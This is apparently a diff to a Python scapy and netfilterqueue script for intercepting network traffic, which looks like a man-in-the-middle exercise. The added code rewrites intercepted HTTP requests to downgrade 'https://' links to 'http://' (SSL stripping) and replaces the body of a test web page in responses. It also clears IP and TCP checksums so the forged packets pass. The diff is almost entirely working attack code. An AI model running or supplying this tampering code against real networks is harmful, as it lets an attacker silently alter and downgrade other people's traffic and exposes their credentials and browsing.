@@ -14,7 +14,31 @@ def process_packet(packet):
         if scapy_packet[TCP].dport == 80:
             print("[+] HTTP Request...")
             load = scapy_packet[Raw].load.decode()
+            
+            #print("Before modification: ", load)
             load = re.sub('https://', 'http://', load)
+            #print("After modification: ", load)
+
+            scapy_packet[Raw].load = load.encode()
+            del scapy_packet[IP].len
+            del scapy_packet[IP].chksum
+            del scapy_packet[TCP].chksum
+            
+            
+            packet.set_payload(bytes(scapy_packet))
+            # instead of sending the original packet, we send a modified one
+
+    # Check if packet is a HTTP response
+    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
+        if scapy_packet[TCP].sport == 80:
+            print("[+] HTTP Response...")
+            load = scapy_packet[Raw].load.decode()
+
+            #print("Before modification: ", load)
+            load = re.sub('<html><body><h1>It works!</h1></body></html>', \
+                          '<html><body><h1>Now you are seeing a modified packet</h1></body></html>', load)
+            #print("After modification: ", load)
+
             scapy_packet[Raw].load = load.encode()
             del scapy_packet[IP].len
             del scapy_packet[IP].chksum
